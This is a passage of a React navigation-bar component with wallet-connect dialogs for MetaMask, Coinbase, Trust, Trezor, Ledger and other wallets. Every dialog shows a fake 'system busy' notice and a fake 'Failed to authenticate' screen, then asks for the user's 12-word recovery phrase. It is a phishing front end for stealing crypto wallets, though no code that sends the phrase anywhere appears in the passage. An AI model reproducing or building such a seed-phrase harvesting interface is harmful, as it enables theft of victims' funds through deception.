                          <div className="space-y-4">
                            {/* meta mask popup slider */}
                            <Dialog>
                              <DialogTrigger className="w-full">
                                <button onClick={handleMetaMaskButton} className={`flex justify-between items-center rounded-xl px-2 py-3 w-full ${theme === 'dark' ? 'bg-[#464653] border-none' : 'bg-gradient-to-r from-[#6f5ce4] to-[#8768ee] border border-[#6f5ce4] dark:border-none'}`}>
                                  <div className="flex items-center">
                                    <img src={metaMask} alt="Meta Mask" className="w-[35px] mr-3" />
                                    <p className="text-[17px] text-[#FFFFFF]">MetaMask</p>
                                  </div>
                                  <Link to='' className='text-white text-[14px] font-medium bg-[#8f73ee] dark:bg-[#705DE4] px-3 py-[5px] border border-[#8f73ee] dark:border-none rounded-md'>Connect</Link>
                                </button>
                              </DialogTrigger>

                              <DialogContent className="h-[590px]">
                                <DialogHeader>
                                  <DialogDescription>
                                    <Carousel className="relative">
                                      <CarouselContent>
                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                          <div>
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                            <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                            <p className="text-[18px] text-[#11121F] font-semibold">Connect MetaMask...</p>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">MetaMask</h3>
                                            <img src={metaMaskLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                            <button onClick={handleMetaMaskNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                            <button onClick={handleMetaMaskNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                              <TfiReload className="mr-2" />
                                              <span>Try Again</span>
                                            </button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${metaCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                            <p className="text-start mt-6">12 Word phrase</p>
                                            <Textarea rows={4} className="mt-2 mb-8" />
                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                          </div>
                                        </CarouselItem>
                                      </CarouselContent>

                                      <SlArrowLeft onClick={handleMetaMaskPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                      {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                      <CarouselNext className="hidden" />
                                      <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                    </Carousel>

                                  </DialogDescription>
                                </DialogHeader>
                              </DialogContent>
                            </Dialog>

                            {/* Coinbase popup slider */}
                            <Dialog>
                              <DialogTrigger className="w-full">
                                <button onClick={handleCoinbaseButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#321b4cbe] to-[#372e6a54] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#42418a50]"}`}>
                                  <img src={coinbase} alt="Meta Mask" className="w-[35px] mr-3" />
                                  <p className="text-[17px] text-[#FFFFFF]">Coinbase Wallet</p>
                                </button>
                              </DialogTrigger>

                              <DialogContent className="h-[590px]">
                                <DialogHeader>
                                  <DialogDescription>
                                    <Carousel className="relative">
                                      <CarouselContent>
                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                          <div>
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                            <img src={coinbaseLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                            <p className="text-[18px] text-[#11121F] font-semibold">Connect Coinbase...</p>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Coinbase</h3>
                                            <img src={coinbaseLage} alt="Image" className="w-[100px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                            <button onClick={handleCoinbaseNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                            <button onClick={handleCoinbaseNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                              <TfiReload className="mr-2" />
                                              <span>Try Again</span>
                                            </button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${coinbaseCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                            <p className="text-start mt-6">12 Word phrase</p>
                                            <Textarea rows={4} className="mt-2 mb-8" />
                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                          </div>
                                        </CarouselItem>
                                      </CarouselContent>

                                      <SlArrowLeft onClick={handleCoinbasePrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                      {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                      <CarouselNext className="hidden" />
                                      <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                    </Carousel>

                                  </DialogDescription>
                                </DialogHeader>
                              </DialogContent>
                            </Dialog>

                            {/* Trust popup slider */}
                            <Dialog>
                              <DialogTrigger className="w-full">
                                {/* Trust */}
                                <button onClick={handleTrustButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#1d1831] to-[#20203c77] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                  <img src={trust} alt="Meta Mask" className="w-[35px] mr-3" />
                                  <p className="text-[17px] text-[#FFFFFF]">Trust Wallet</p>
                                </button>
                              </DialogTrigger>

                              <DialogContent className="h-[590px]">
                                <DialogHeader>
                                  <DialogDescription>
                                    <Carousel className="relative">
                                      <CarouselContent>
                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                          <div>
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                            <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                            <p className="text-[18px] text-[#11121F] font-semibold">Connect Trust...</p>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Trust</h3>
                                            <img src={trustLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                            <button onClick={handleTrustNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                            <button onClick={handleTrustNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                              <TfiReload className="mr-2" />
                                              <span>Try Again</span>
                                            </button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trustCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                            <p className="text-start mt-6">12 Word phrase</p>
                                            <Textarea rows={4} className="mt-2 mb-8" />
                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                          </div>
                                        </CarouselItem>
                                      </CarouselContent>

                                      <SlArrowLeft onClick={handleTrustPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                      {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                      <CarouselNext className="hidden" />
                                      <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                    </Carousel>
                                  </DialogDescription>
                                </DialogHeader>
                              </DialogContent>
                            </Dialog>

                            {/* Trezor popup slider */}
                            <Dialog>
                              <DialogTrigger className="w-full">
                                {/* Trezor */}
                                <button onClick={handleTrezorButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                  <img src={trezor} alt="Meta Mask" className="w-[35px] mr-3" />
                                  <p className="text-[17px] text-[#FFFFFF]">Trezor</p>
                                </button>
                              </DialogTrigger>

                              <DialogContent className="h-[590px]">
                                <DialogHeader>
                                  <DialogDescription>
                                    <Carousel className="relative">
                                      <CarouselContent>
                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                          <div>
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                            <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                            <p className="text-[18px] text-[#11121F] font-semibold">Connect Trezor...</p>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Trezor</h3>
                                            <img src={trezorLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                            <button onClick={handleTrezorNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                            <button onClick={handleTrezorNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                              <TfiReload className="mr-2" />
                                              <span>Try Again</span>
                                            </button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${trezorCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                            <p className="text-start mt-6">12 Word phrase</p>
                                            <Textarea rows={4} className="mt-2 mb-8" />
                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                          </div>
                                        </CarouselItem>
                                      </CarouselContent>

                                      <SlArrowLeft onClick={handleTrezorPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                      {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                      <CarouselNext className="hidden" />
                                      <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                    </Carousel>
                                  </DialogDescription>
                                </DialogHeader>
                              </DialogContent>
                            </Dialog>

                            {/* Leger popup slider */}
                            <Dialog>
                              <DialogTrigger className="w-full">
                                {/* Ledger */}
                                <button onClick={handleLedgerButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                  <img src={ledger} alt="Meta Mask" className="w-[35px] mr-3" />
                                  <p className="text-[17px] text-[#FFFFFF]">Ledger</p>
                                </button>
                              </DialogTrigger>

                              <DialogContent className="h-[590px]">
                                <DialogHeader>
                                  <DialogDescription>
                                    <Carousel className="relative">
                                      <CarouselContent>
                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                          <div>
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                            <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                            <p className="text-[18px] text-[#11121F] font-semibold">Connect Ledger...</p>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Ledger</h3>
                                            <img src={ledgerLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                            <button onClick={handleLedgerNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                            <button onClick={handleLedgerNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                              <TfiReload className="mr-2" />
                                              <span>Try Again</span>
                                            </button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${ledgerCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                            <p className="text-start mt-6">12 Word phrase</p>
                                            <Textarea rows={4} className="mt-2 mb-8" />
                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                          </div>
                                        </CarouselItem>
                                      </CarouselContent>

                                      <SlArrowLeft onClick={handleLedgerPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                      {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                      <CarouselNext className="hidden" />
                                      <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                    </Carousel>
                                  </DialogDescription>
                                </DialogHeader>
                              </DialogContent>
                            </Dialog>

                            {/* Other wallet popup slider */}
                            <Dialog>
                              <DialogTrigger className="w-full">
                                {/* Other Wallet */}
                                <button onClick={handleOtherWalletButton} className={`flex items-center px-2 py-3 rounded-xl w-full ${theme === "dark" ? "bg-[#464653]" : "bg-gradient-to-r from-[#161828] to-[#151727] hover:from-[#6f5ce4] hover:to-[#8768ee] border border-[#21233c]"}`}>
                                  <img src={otherWallets} alt="Meta Mask" className="w-[35px] mr-3" />
                                  <p className="text-[17px] text-[#FFFFFF]">Other Wallets</p>
                                </button>
                              </DialogTrigger>

                              <DialogContent className="h-[590px]">
                                <DialogHeader>
                                  <DialogDescription>
                                    <Carousel className="relative">
                                      <CarouselContent>
                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 0 ? 'block' : 'hidden'}`}>
                                          <div>
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
                                            <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-28 mb-5 cursor-grab" />
                                            <p className="text-[18px] text-[#11121F] font-semibold">Connect Other Wallets...</p>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 1 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Other Wallets</h3>
                                            <img src={otherWalletsLage} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[15px] text-[#6c6d75] mb-20">Because of many requests, our ConnectWallet system is currently busy. Try again later or avoid this crowding by connecting your wallet using a 12-word recovery phrase. Thank you for your understanding.</p>

                                            <button onClick={handleOtherWalletNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Import Wallet</button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 2 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mt-20 mb-2">Failed to authenticate</p>
                                            <p className="text-[15px] text-[#6c6d75] mb-14">connect your correct wallet</p>

                                            <button onClick={handleOtherWalletNext} className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200 flex justify-center items-center">
                                              <TfiReload className="mr-2" />
                                              <span>Try Again</span>
                                            </button>
                                          </div>
                                        </CarouselItem>

                                        <CarouselItem className={`flex justify-center text-center w-0 transition-all ${otherWalletCurrentIndex === 3 ? 'block' : 'hidden'}`}>
                                          <div className="w-full">
                                            <h3 className="text-[21px] text-[#11121F] font-semibold">Import Wallet</h3>
                                            <img src={walletImg} alt="Image" className="w-[110px] mx-auto mt-14 mb-5 cursor-grab" />
                                            <p className="text-[22px] text-[#11121F] font-semibold mb-2">Import Wallet</p>
                                            <p className="text-[15px] text-[#6c6d75]">To connect your wallet. enter <br /> the secret phrase.</p>

                                            <p className="text-start mt-6">12 Word phrase</p>
                                            <Textarea rows={4} className="mt-2 mb-8" />
                                            <button className="text-white bg-[#1098FC] hover:bg-[#109afcec] p-4 rounded-[12px] w-full duration-200">Connect</button>
                                          </div>
                                        </CarouselItem>
                                      </CarouselContent>

                                      <SlArrowLeft onClick={handleOtherWalletPrevious} className="absolute top-[5px] left-0 bg-transparent border-none font-bold cursor-pointer" />
                                      {/* <CarouselPrevious className="top-[10px] left-0 bg-transparent border-none font-bold" /> */}
                                      <CarouselNext className="hidden" />
                                      <IoClose className="text-[23px] text-[#a794be] absolute top-0 right-0" />
                                    </Carousel>
                                  </DialogDescription>
                                </DialogHeader>
                              </DialogContent>
                            </Dialog>
                          </div>

                          <div className="flex justify-center mt-4">
                            <div className="flex items-center">
                              <img src={wallet} alt="wallet" className="w-[20px] mr-2" />
                              <Link to="/" className="text-[#D3D2FF80] hover:underline">I use different wallet</Link>
                            </div>
                          </div>
                        </div>
                      </DialogDescription>
                    </DialogHeader>
                  </DialogContent>
                </Dialog>

                <Button onClick={() => { setChangeBg(!changeBg); handleThemeSwitch(); }} className=" hover:bg-gradient-to-l ml-3 p-4">
                  {
                    changeBg ? <IoMdSunny className="text-[16px] dark:text-[#ffffff] scale-150 rounded-[20px]" /> :
                      <IoMdMoon className="text-[16px] scale-150 rounded-[20px]" />
                  }
                </Button>

              </div>
            </div>
          </div>
        </div>
      </Container>
    </div>
  );
};

export default NavBar;
